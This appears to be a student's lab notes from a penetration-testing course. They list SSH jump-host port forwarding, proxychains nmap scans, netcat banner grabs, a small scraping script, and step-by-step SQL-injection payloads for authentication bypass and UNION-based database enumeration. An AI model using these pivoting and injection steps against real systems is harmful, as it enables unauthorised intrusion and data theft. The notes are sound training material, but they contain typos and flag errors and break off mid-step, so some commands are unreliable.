tunneling _________________________________________________________________________________________________________________________________________________________________________________________________________________
## Control sockets ## 
ssh -MS /tmp/jump student@<JUMP IP> 
password: <VARO password> 

## to find usable IPs ##
for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done

## Dynamic Port Forwarding ##
ssh -S /tmp/jump jump -O forward -D 9050 

## Scan Found Targets ##
proxychains nmap <IPs,4th,4th>

## Banner grab to ensure ports are actually giving correct services ##
proxychains nc <ip found> <port found>

## Port Forward to found ports ##
ssh - S /tmp/jump jump -O forward -L <RHP1>:<found IP>:<open port>  -L <RHP2>:<found IP>:<open port> -L <RHP3>:<found IP2>:<open port> -L <RHP4>:<found IP2>:<open port> ## {as many as is needed}

## close 1 or 2 (or all) Port Forwards ##
ssh - S /tmp/jump jump -O cancel -L <RHP1>:<found IP>:<open port>  -L <RHP2>:<found IP>:<open port> -L <RHP3>:<found IP2>:<open port> -L <RHP4>:<found IP2>:<open port> ## {as many as is needed}

## Navigate to web server ##
## firefox 
127.0.0.1:1111

## Authenicate to <found IP> ##
ssh -MS /tmp/<t1> <username>@127.0.0.1 -p <RHP1-12>

## Ping sweep new network ID ##
ping sweep <Net ID>

## Set up dynamic port forwarding ##
ssh -S /tmp/jump jump -O cancel -D 9050 ##Must cancel OG -D first##
ssh -S /tmp/<t1> <t1> -O forward -d 9050

## scan new IP ##
proxychains nmap <new IPS>

##### Notionally found 80 -HTTP, 22 - SSH #####

## Port forward to new webserver ##
ssh -S /tmp/<t1> <t1> -O forward -L <RHP2>:<found IP>:<open port> -L <RHP3>:<found IP2>:<open port> -L <RHP4>:<found IP2>:<open port> ## {as many as is needed}

## Firefox ##
127.0.0.1:3111

creds found : student :: password
ssh -MS /tmp/t2 student@127.0.0.1 -p 3111
Password: password

### nmap scripts ###
proxychains nmap --script=http-enum <IP>
to find scripts you may use -
ls -l /usr/share/nmap/scripts | grep <http>


### lxml script ###
#!/usr/bin/env python

import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ", authors)

SQL ______________________________________________________________________________________________________________________________________________________________________________________________________________________
## SQL ##
SELECT and UNION (most used)
## authenication bypass ##
1. in username and password 'or1='1
2. f12
3. select post 
4. go to left pane select request
5. turn to raw
6. add to url after a ? hit enter gives all values that equal true

## database dump ##
ssh into server (wiht root perms)
&> mysql
]> show databases ; (3 databases: informations_ scheme(most important), performance_scheme, mysql)
];
]> <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN>, from <NAME OF DATABASE>,<NAME OF TABLE>
]> use information_schema ; 
]> show tables ;
]> show columns from columns ;
]> select tireid,name,size from session.Tires ;

## steps for SQL injection ##
Step 1-Idenitfy Vulnerable Field/Selection
<field> ' or 1='1
Step 2- Identify the Number of Columns/Server Side Selections
<field>' UNION SELECT 1,2,3,4 #
Step 3 - Modify Golden Statement
<feild>' UNION SELECT table_schema,2,table_name,column_name, 4 from information_schema.columns #
Step 4 - Craft Queries
<feild>' UNION SELECT 

## GET method in URL ##
step1: identify vulnerable selection
selection= 2,3,4
step2: identify number of  
.com'\', 1)#
